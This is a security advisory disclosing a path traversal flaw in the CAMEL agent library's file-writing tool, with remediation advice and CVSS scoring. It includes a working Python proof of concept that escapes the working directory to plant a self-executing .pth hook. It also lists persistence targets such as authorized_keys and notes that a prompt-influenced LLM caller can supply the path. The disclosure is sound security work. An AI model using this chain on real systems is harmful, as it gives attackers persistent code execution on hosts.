# CAMEL FileToolkit working_directory path traversal allows arbitrary file write and persistent code execution (CWE-22, CVSS 9.8)

## Summary

An attacker who can influence the `filename` argument of `FileToolkit.write_to_file()` -- by calling the toolkit directly, or through the tool's intended LLM caller whose input the attacker can shape -- escapes the toolkit's `working_directory` containment and creates or overwrites arbitrary files on the host with the privileges of the CAMEL process. The path resolver sanitizes only the filename component of the supplied path: directory components such as `../` pass through unchanged, no containment comparison is performed anywhere in the toolkit, and missing directories on the escaped path are created automatically. Because the written content is attacker-chosen, a Python `.pth` site-hook file dropped into the Python library directory turns the arbitrary write into persistent code execution: every subsequently started Python process of that Python installation executes `.pth` import lines automatically.

## Details

`FileToolkit` is CAMEL's standard agent file-operations toolkit: it is exported from `camel.toolkits` (camel/toolkits/__init__.py:70), documented in `docs/reference/camel.toolkits.file_toolkit.md`, and `get_tools()` exposes `write_to_file` as the first tool available to a model caller (camel/toolkits/file_toolkit.py:1755-1771). The constructor argument `working_directory` is documented as "The default directory for output files" (file_toolkit.py:53-57; when neither the argument nor the `CAMEL_WORKDIR` environment variable is set, it defaults to `./camel_working_dir`, :66-73), and `write_to_file()`'s own contract is more specific: a relative `filename` is documented to resolve into `self.working_directory` (:1093-1094).

The containment fails in the path resolver used by `write_to_file`:

```python
# camel/toolkits/file_toolkit.py:96-102 -- the entire path handling for
# tool-supplied paths: filename-only sanitization, no directory validation
path_obj = Path(file_path)
if not path_obj.is_absolute():
    path_obj = self.working_directory / path_obj

sanitized_filename = self._sanitize_filename(path_obj.name)
path_obj = path_obj.parent / sanitized_filename
return path_obj.resolve()
```

1. **Only the filename component is sanitized.** `_sanitize_filename()` (file_toolkit.py:124-138) rewrites characters in the final component only (`re.sub(r'[^\w\-.]', '_', filename)`, :137). The directory component -- including any number of `../` segments -- is carried through untouched (`path_obj.parent / sanitized_filename`, :101).

2. **No containment comparison exists.** After `Path.resolve()` normalizes the `../` segments, nothing checks that the result is still inside `self.working_directory`: a whole-file inspection of file_toolkit.py finds no `is_relative_to`/`commonpath`/prefix check on any code path. The absolute-path branch (:97-98) is a second, independent bypass -- an absolute `filename` is never joined to `working_directory` at all; it is used where it points (its final component still passes through `_sanitize_filename`, but no redirection into `working_directory` ever happens).

3. **The write trigger also builds the escape destination.** `write_to_file()` resolves the caller-supplied `filename` through this resolver and creates every missing directory on it before writing (file_toolkit.py:1103-1104):

```python
# camel/toolkits/file_toolkit.py:1103-1104
file_path = self._resolve_filepath(filename)
file_path.parent.mkdir(parents=True, exist_ok=True)
```

The vulnerable logic is not confined to the audited pre-release: `camel/toolkits/file_toolkit.py` is byte-identical (git blob `810d2f752c50daf592f27e81cde9b6c4c427baa6`) in the latest stable PyPI release 0.2.90, in 0.2.91a5, and in the current master branch. The component first shipped in 0.2.76a1 -- the wheels of 0.2.75 and 0.2.76a0 do not contain `camel/toolkits/file_toolkit.py`, and the 0.2.76a1 wheel already carries the same resolver logic shown above -- and none of the six commits that ever touched the file introduced a containment check.

**Why this is a vulnerability:**

- *"The code documents the opposite contract."* `write_to_file()`'s own docstring states: "filename (str): The name or path of the file. If a relative path is supplied, it is resolved to self.working_directory." (file_toolkit.py:1093-1094). A caller -- human or model -- supplying the relative path `../x` is promised a resolution into the working directory; the implementation writes outside it. The resolver's docstring likewise says the filename sanitization ensures "safe usage in downstream processing" (file_toolkit.py:86-88): the code's own intent is path hygiene, implemented only for the final component.
- *"working_directory is a convenience default, not a security boundary."* The toolkit itself treats the path as a safety-relevant input -- that is what the filename sanitization exists for -- and stops halfway. An agent-facing tool that accepts any relative or absolute path for file creation and overwriting grants the model's caller a host-wide write primitive from a component whose documented surface is a working directory. Workspace-boundary escapes are tracked as vulnerabilities in comparable agentic coding tools (CVE-2025-59532: a sandbox writable-root misconfiguration enabling arbitrary file writes and command execution; CVE-2025-54794: a path-validation flaw enabling access to files outside the working directory).
- *"An LLM must be persuaded, so this is prompt injection, not a vulnerability."* No LLM is involved in the PoC below: calling `write_to_file()` directly with a `../` path performs the escape. The LLM is the intended caller of this tool (that is what the tool exists for); the defect -- honoring arbitrary paths with no containment -- is independent of who composed the arguments. The PoC isolates the control failure from LLM behavior; in deployment the same arguments arrive from the model caller that the toolkit is designed to serve.
- *"The operator can just not expose the toolkit."* The toolkit is designed to be served, not only imported: the class is decorated `@MCPServer()` (file_toolkit.py:29), the library's mechanism for registering a `BaseToolkit`'s tools with a FastMCP server (camel/utils/mcp.py:133), and toolkit functions are registered into the library's OpenAPI-compatible `ChatAgentOpenAPIServer` through `tool_registry` (agent_openapi_server.py:136, :192) -- the shipped example `examples/services/agent_openapi_server.py` builds exactly such a registry (`tool_registry = {"search_wiki": [wiki_tool]}`, :44). Serving a file toolkit through these surfaces is the project's own documented usage pattern, and none of these surfaces adds a path-containment layer.
- *"write_to_file is meant for agent-generated documents, so the .pth payload is abuse."* The defect is the destination, not the payload: the resolver applies to any caller-supplied path, the tool natively writes any extension as plain text through its fallback writer (no content policy exists), and the same escaped write overwrites arbitrary existing files (docstring: "If the file exists, it will be overwritten") -- the `.pth` chain is one demonstration of the write primitive, not the definition of the vulnerability.

**Suggested remediation:**

1. Contain every resolver output: after `resolve()`, verify `file_path.is_relative_to(self.working_directory.resolve())` and reject the call otherwise -- in `_resolve_filepath()`, and equally in `_resolve_existing_filepath()` (:113-118) and `_resolve_search_path()` (:104-111), which share the same unvalidated join and are used by the toolkit's read/edit/search tools.
2. Reject `..` segments and absolute paths in tool-facing path arguments (or normalize first and require the result to stay inside `working_directory`).
3. Where deployments genuinely need broader access, gate it behind an explicit opt-in flag (default off) rather than unbounded path handling.

## Proof of Concept

Dynamically verified against v0.2.91a5 on Windows 11 (August 2026): 10/10 automated assertions passing (baseline write inside the sandbox, escape write of the `.pth` outside it, automatic execution of the site hook by a fresh Python process, and full cleanup). No LLM, no server, and no network are involved at any point. Setup:

```bash
pip install "camel-ai==0.2.91a5" "mcp<2"
```

Dependency note: a current `mcp` 2.x release removes `mcp.server.FastMCP`, which camel-ai 0.2.91a5's unbounded `mcp>=1.3.0` pin does not account for -- without the `<2` pin, every `camel.toolkits` import fails at startup (the latest 1.x release, `mcp` 1.29.1, still provides them). Nothing else is needed: the `.pth` payload falls through to the toolkit's plain-text writer, so no optional extras (docx/pdf writers, web tools) are required.

```python
# poc.py -- FileToolkit.write_to_file escapes working_directory and lands a
# Python .pth site hook in the library directory -> persistent code execution.
# The sandbox is deliberately created inside the Python library directory so a
# single '../' step lands the file in site-packages; any directory outside the
# working_directory is equally writable.
import os
import shutil
import subprocess
import sys
import tempfile
import time

import camel
from camel.toolkits import FileToolkit

marker = os.path.join(tempfile.gettempdir(), "camel_poc_marker.txt")
safe_marker = marker.replace("\\", "/")   # forward slashes survive the shell redirect

site_packages = os.path.dirname(os.path.dirname(camel.__file__))
sandbox = os.path.join(site_packages, "camel_poc_sandbox")
evil_pth = os.path.join(site_packages, "evil_poc.pth")

os.makedirs(sandbox, exist_ok=True)
tk = FileToolkit(working_directory=sandbox)   # working_directory = containment

# 1) baseline: a write that honors the containment lands inside the sandbox
print(tk.write_to_file(title="t", content="inside ok", filename="inside.txt"))
# -> Content successfully written to file: ...\camel_poc_sandbox\inside.txt

# 2) traversal: '../' escapes the sandbox -- the filename part is sanitized,
#    the directory part is not, and no containment check rejects the result
print(tk.write_to_file(
    title="t",
    content="import os; os.system('echo POC_EXECUTED > {m}')\n".format(m=safe_marker),
    filename="../evil_poc.pth",
))
# -> Content successfully written to file: ...\site-packages\evil_poc.pth

# 3) a fresh Python process of this installation executes .pth import lines
#    at startup (site module):
subprocess.run([sys.executable, "-c", "pass"], check=False)
time.sleep(1)
print("marker content:", open(marker).read().strip())
# -> marker content: POC_EXECUTED

# 4) cleanup
for p in (evil_pth, marker):
    if os.path.exists(p):
        os.remove(p)
shutil.rmtree(sandbox, ignore_errors=True)
```

Expected output (paths abbreviated): both writes return `Content successfully written to file: ...` -- the second one pointing at `<site-packages>\evil_poc.pth`, outside the sandbox -- and the marker line prints `marker content: POC_EXECUTED`, proving the written file was executed as code by a Python process that never received it as input.

## Impact

- **Type:** path traversal / improper limitation of a pathname to a restricted directory (CWE-22) in an agent-facing file-write tool. The demonstrated escalation -- a `.pth` site-hook file written into the Python library directory and executed by the `site` module at interpreter startup -- is code injection/execution (CWE-94).
- **Who is impacted:** any application that gives agents `FileToolkit` with a `working_directory` (the toolkit's intended configuration) wherever the tool caller's path input can be attacker-influenced: a prompt-influenced LLM caller, a compromised automation client, or an attacker-facing endpoint that serves the toolkit's tools through the library's own MCP/OpenAPI mechanisms. The code-execution escalation additionally requires that the CAMEL process can write to a self-loading location -- for the demonstrated `.pth` chain, the Python library directory (writable by default under user-scoped installations such as conda or `pip --user`).
- **Attacker capabilities:** arbitrary file creation and overwrite with the privileges of the CAMEL process, including directories that do not yet exist (`mkdir(parents=True)` on the escaped path, file_toolkit.py:1104); persistent code execution in every subsequently started Python process of that installation via the `.pth` site hook; by the same write primitive, overwriting `~/.bashrc`, `~/.ssh/authorized_keys`, cron entries, or git hooks -- enabling reading secrets (via executed code), destroying or corrupting data, and establishing persistence on the host.
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 (Critical).
  - AV:N -- the toolkit is designed to be invoked from networked surfaces the library itself ships (FastMCP serving via the `@MCPServer()` class decorator; `FunctionTool` registration in ChatAgentOpenAPIServer); on such deployments the attacker's path input reaches `write_to_file()` remotely, directly or through the model caller. The PoC's direct-library route is local.
  - AC:L -- a single fixed `../` prefix defeats the only path hygiene the toolkit performs; verified by the automated checks in the PoC above.
  - PR:N -- the trigger requires no privileges beyond the ability to invoke the tool, which is the toolkit's designed exposure to its callers; no authentication is added by the toolkit itself.
  - UI:N -- the tool call is the entire attack; no victim interaction.
  - S:U -- the write and the demonstrated execution occur with the CAMEL process's own privileges; the impact stays within the authority the process already holds.
  - C:H / I:H / A:H -- within that authority: arbitrary read (via executed code), arbitrary write/overwrite, and arbitrary process/code control.

**Scope note (alternate scoring).** If the scope is instead treated as Changed -- the `.pth` site hook executes in Python processes other than the vulnerable component -- the same vector with S:C scores **10.0** (Critical) (alternate vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`). Both values were computed with the official FIRST CVSS v3.1 formula: ISS = 1-(1-0.56)^3 = 0.914816; Impact(S:U) = 6.42x0.914816 = 5.8731, Impact(S:C) = 7.52x(0.914816-0.029) - 3.25x(0.914816-0.02)^15 = 6.0477; Exploitability = 8.22x0.85x0.77x0.85x0.85 = 3.8870; Base(S:U) = round-up(5.8731+3.8870) = 9.8; Base(S:C) = round-up(min(1.08x(6.0477+3.8870), 10)) = 10.0.

## Affected products

| Field | Value |
|------|------|
| **Ecosystem** | `pip` |
| **Package name** | `camel-ai` |
| **Affected versions** | `>= 0.2.76a1, <= 0.2.91a5` |
| **Patched versions** | `None` |

## Severity

| Field | Value |
|------|------|
| **Severity** | `Critical` |
| **Vector string** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Score** | `9.8` |

## Weaknesses

| # | CWE | Name | Rationale |
|:--:|------|------|------|
| 1 (primary) | CWE-22 | Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') | `_resolve_filepath` performs no containment check after resolution (file_toolkit.py:96-102; a whole-file search finds no `is_relative_to`/`commonpath`), and both escape routes -- `../` segments and absolute paths -- reach `write_to_file` directly (:1103; source-verified) |
| 2 | CWE-94 | Improper Control of Generation of Code ('Code Injection') | the `.pth` site hook written through the escaped path is executed automatically by the `site` module at interpreter startup, which runs its import lines (demonstrated dynamically in the PoC by the marker file landing on disk) |
